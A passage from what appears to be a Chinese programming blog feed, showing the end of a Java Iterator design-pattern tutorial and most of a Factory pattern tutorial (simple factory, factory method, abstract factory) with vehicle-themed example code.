Node next;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Node</span><span class="hljs-params">(Object o)</span></span>&#123;<br>            object = o;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Collection_ list = <span class="hljs-keyword">new</span> ArrayList_();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>            list.add(<span class="hljs-keyword">new</span> String(<span class="hljs-string">"s"</span>) + i);<br>        &#125;<br><br>        System.out.println(list.size());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>ArrayList_和LinkList_都实现了Collection_接口,重写了add()和size()方法。</p>
<p>到这里,前期准备工作就完成了。</p>
<p>接着,甲方爸爸又提出新的需求,我要将容器中的所有数据取出来,并且这个遍历是通用的。<br>也就是我数组容器可以遍历,链表容器也可以遍历,以后的Hash,Queue…都可以用这个遍历。</p>
<p>麻烦了</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList_ al = (ArrayList_)list;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; al.size(); i++) &#123;<br>    <span class="hljs-comment">//如果用这种方式变量,就不能实现互通了</span><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>你是不是准备这样做,但是甲方爸爸不让你这样做。</p>
<p>于是咋办,你想了想,计从心来:</p>
<p><font color="#FF8C00" size="5" face="Open Sans">创建一个Iterator接口,然后让这些容器,自己来实现这些遍历</font></p>
<p>你很快写下来以下代码:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Iterator_</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">hasNext</span><span class="hljs-params">()</span></span>;<br><br>    <span class="hljs-function">Object <span class="hljs-title">next</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Collection_</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object obj)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>;<br><br>    <span class="hljs-function">Iterator_ <span class="hljs-title">iterator</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArrayList_</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Collection_</span></span>&#123;<br>    Object[] objects = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">10</span>];<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index == objects.length)&#123;<br>            Object[] newObject = <span class="hljs-keyword">new</span> Object[objects.length*<span class="hljs-number">2</span>];<br>            System.arraycopy(objects, <span class="hljs-number">0</span>, newObject, <span class="hljs-number">0</span>, objects.length);<br>            objects = newObject;<br>        &#125;<br>        objects[index++] = obj;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Iterator_ <span class="hljs-title">iterator</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayListIterator();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArrayListIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Iterator_</span></span>&#123;<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> currentIndex = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasNext</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">if</span> (index &gt; currentIndex) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">next</span><span class="hljs-params">()</span> </span>&#123;<br>            Object obj = objects[currentIndex];<br>            currentIndex++;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LinkList_</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Collection_</span> </span>&#123;<br>    Node head = <span class="hljs-keyword">null</span>;<br>    Node tail = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Node node = <span class="hljs-keyword">new</span> Node(obj);<br>        node.next = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-keyword">null</span>) &#123;<br>            head = node;<br>            tail = node;<br>        &#125;<br><br>        tail.next = node;<br>        tail = node;<br>        index++;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span> </span>&#123;<br>        Object o;<br>        Node next;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Node</span><span class="hljs-params">(Object o)</span> </span>&#123;<br>            <span class="hljs-keyword">this</span>.o = o;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Iterator_ <span class="hljs-title">iterator</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayListIterator();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArrayListIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Iterator_</span></span>&#123;<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> currentIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">private</span> Node tmp = head;<br>        <span class="hljs-keyword">private</span> Node lastReturn;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasNext</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">if</span> (index &gt; currentIndex) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">next</span><span class="hljs-params">()</span> </span>&#123;<br>            lastReturn = tmp;<br>            tmp = tmp.next;<br>            currentIndex++;<br>            <span class="hljs-keyword">return</span> lastReturn.o;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Collection_ list = <span class="hljs-keyword">new</span> LinkList_();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>            list.add(<span class="hljs-keyword">new</span> String(<span class="hljs-string">"s"</span>) + i);<br>        &#125;<br><br>        Iterator_ iterator = list.iterator();<br>        <span class="hljs-keyword">while</span> (iterator.hasNext())&#123;<br>            Object next = iterator.next();<br>            System.out.println(next);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里是将,Iterator接口定义在Collection接口中,然后由容器内部将Iterator接口实现(完美)</p>
<br>

<p>&emsp;&emsp;就这样,你又一次完成了甲方爸爸的需求,但是你没有上次开心,是啊,摸鱼划水谁不想呢?</p>
</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式4-Factory</title>
    <url>/article/bf0cec1d.html</url>
    <content><![CDATA[<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title=" 工厂模式"></a><a href="https://www.runoob.com/design-pattern/factory-pattern.html" target="_blank" rel="noopener"> 工厂模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;工厂模式（Factory Pattern）是 Java 中最常用的设计模式之一。这种类型的设计模式属于<font color="#FFB6C1" size="5" face="Open Sans"> 创建型模式 </font>，它提供了一种创建对象的最佳方式。</p>
<p>在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
<p>如果想了解工厂模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/decorator-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-工厂模式</a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Factory.png" srcset="/img/loading.gif" title="简单工厂"><br></p>
<p><img src="https://qiniuyun.fxhstudy.com/FactoryMethod.png" srcset="/img/loading.gif" title="工厂方法"><br></p>
<p><img src="https://qiniuyun.fxhstudy.com/AbstractFactory.png" srcset="/img/loading.gif" title="抽象方法"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：<br>1、一个调用者想创建一个对象，只要知道其名称就可以了。<br>2、扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。<br>3、屏蔽产品的具体实现，调用者只关心产品的接口。</p>
<p>缺点： 每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。<br>2、数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。<br>3、设计一个连接服务器的框架，需要三个协议，”POP3”、”IMAP”、”HTTP”，可以把这三个作为产品类，共同实现一个接口。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><h3 id="简单工厂"><a href="#简单工厂" class="headerlink" title="简单工厂"></a>简单工厂</h3><p>首先实现需求，任意定制交通工具，然后实现Moveable()接口。</p>
<p>这里我们首先创建三个对象，Car、Plane、Broom，实现Moveable接口</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Moveable<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Moveable</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">go</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br>Car<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Car</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Moveable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">go</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"Car go"</span>);<br>    &#125;<br>&#125;<br><br>Plane<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Plane</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Moveable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">go</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"Plane go"</span>);<br>    &#125;<br>&#125;<br><br>Broom<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Broom</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Moveable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">go</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"Broom go"</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function">Main<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Moveable m = <span class="hljs-keyword">new</span> Car();<br>        m.go();<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>在任意定制交通工具之后，这时我要求任意定制生产过程<br>什么意思呢？比如说，当我们生产交通工具时，我们要求控制其权限<br>有人会说，我在new 之前写一串判断的代码，但仔细想想，我们不止单单Car一个类，<br>对于Car、Broom、Plane等等，它的权限是不一样的<br>这就意味着，如果你在new之前写了判断，则创建不同的类型实例，就要更改代码</p>
<p>解决方法<br>我们可以将产生对象的方法交给工厂去完成，并且此时可以在工厂中判断其权限，设置日志啥的。<br>接着创建简单工厂</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">SimpleVehicleFactory<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleVehicleFactory</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Car <span class="hljs-title">createCar</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">// before processing</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Car();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Broom <span class="hljs-title">createBroom</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Broom();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Plane <span class="hljs-title">createPlane</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Plane();<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>创建好工厂以后，我们只需要直接使用工厂即可</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        SimpleVehicleFactory svf = <span class="hljs-keyword">new</span> SimpleVehicleFactory();<br>        svf.createCar();<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这就是简单工厂，本质就是一个简单的多态。<br>但弊端还是要说的：<br>简单工厂的可扩展性不好<br>当新添加一种类时，又要在其中加入新的方法，并且 before processing 还是要写死。</p>
<h2 id="工厂方法"><a href="#工厂方法" class="headerlink" title="工厂方法"></a>工厂方法</h2><p>此时对于以上情况，我们还可以针对每一种产品做一种工厂:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">CarFactory<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CarFactory</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Moveable <span class="hljs-title">create</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"a car created!"</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Car();<br>    &#125;<br>&#125;<br><br>BroomFactory<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BroomFactory</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Moveable <span class="hljs-title">create</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"a broom created!"</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Broom();<br>    &#125;<br>&#125;<br><br>PlaneFactory<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlaneFactory</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Moveable <span class="hljs-title">create</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"a plane created!"</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Plane();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function">Mian<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Moveable moveable = <span class="hljs-keyword">new</span> CarFactory().create();<br>        moveable.go();<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这样一看是不是就好多了，这就是工厂方法。<br>为每一个子类建立一个对应的工厂子类，这些工厂子类实现同一个抽象工厂接口。这样，创建不同工厂(交通工具)，只需要实现不同的工厂子类。当有新工厂(交通工具)加入时，新建具体工厂继承抽象工厂，而不用修改任何一个类。</p>
<h3 id="抽象工厂"><a href="#抽象工厂" class="headerlink" title="抽象工厂"></a>抽象工厂</h3><p>接着我们继续提出要求，要求定制产品一族。<br>什么意思呢？<br>上面我们制造了交通工具，接下来我们要求，一个司机开着汽车，吃着面包，吸着烟</p>
<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Car<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Car</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">go</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"DiDiDi..."</span>);<br>    &#125;<br>&#125;<br><br>Bread<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bread</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"bread..."</span>);<br>    &#125;<br>&#125;<br><br>Smoking<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Smoking</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">act</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"XiXiXi..."</span>);<br>    &#125;<br>&#125;<br><br>Main<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Car car = <span class="hljs-keyword">new</span> Car();<br>        car.go();<br>        Bread bread = <span class="hljs-keyword">new</span> Bread();<br>        bread.eat();<br>        Smoking smoking = <span class="hljs-keyword">new</span> Smoking();<br>        smoking.act();<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这个时候，我们再提出将这个司机改为原始人。原始人骑着猪，吃着肉，喝着水。<br>难实现吗？一点也不难，但当我们在实现的时候，Main方法中的定义、调用都需要重写，极其麻烦。</p>
<p>这个时候，我们就需要用到抽象工厂的思想了。</p>
<p>大致思想是这样的，首先，我们创建一个抽象工厂，它会产生三种不同的抽象产品Act、Food、Vehicle</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">AbstractFactory<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractFactory</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> Food <span class="hljs-title">createFood</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> Act <span class="hljs-title">createAct</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> Vehicle <span class="hljs-title">createVehicle</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br>Act<br><span 